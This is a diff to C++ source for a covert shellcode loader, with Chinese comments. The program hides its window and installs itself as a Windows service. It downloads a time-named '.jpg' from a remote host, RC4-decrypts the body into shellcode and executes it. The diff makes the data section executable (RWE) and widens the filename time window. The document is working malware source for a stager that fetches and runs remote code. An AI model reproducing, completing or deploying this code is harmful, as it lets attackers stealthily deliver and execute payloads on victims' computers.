@@ -11,7 +11,7 @@
 #include "rc4/ARC4.h"
 
 //data段可读写  
-//#pragma comment(linker, "/section:.data,RWE")   
+#pragma comment(linker, "/section:.data,RWE")   
 //不显示窗口  
 #pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")  
 #pragma comment(linker, "/INCREMENTAL:NO")
@@ -111,7 +111,7 @@ void DecPayload(std::string key)
 	std::string host = std::string(target);
 	HttpRequest httpReq(host, port);
 	time_t myt = time(NULL);
-	int filename = int(int(myt) / 10);
+	int filename = int(int(myt) / 100);
 
 	std::string res = httpReq.HttpGet("/"+ std::to_string(filename)+".jpg");
 	std::string body = httpReq.getBody(res);
@@ -121,6 +121,7 @@ void DecPayload(std::string key)
 	ARC4 rc4;
 	rc4.setKey((unsigned char*)key.c_str(), key.length());
 	rc4.encrypt(c_payload, shellcode, shellcode_size);
+
 	LoadShellCode(shellcode);
 	
 }
@@ -221,6 +222,6 @@ int main()
 	//如果要不安装服务运行，请直接DecPayload(GetKey());
 	ServiceInstall();
 	//DecPayload(GetKey());
-
+	
     return 0;  
 }  
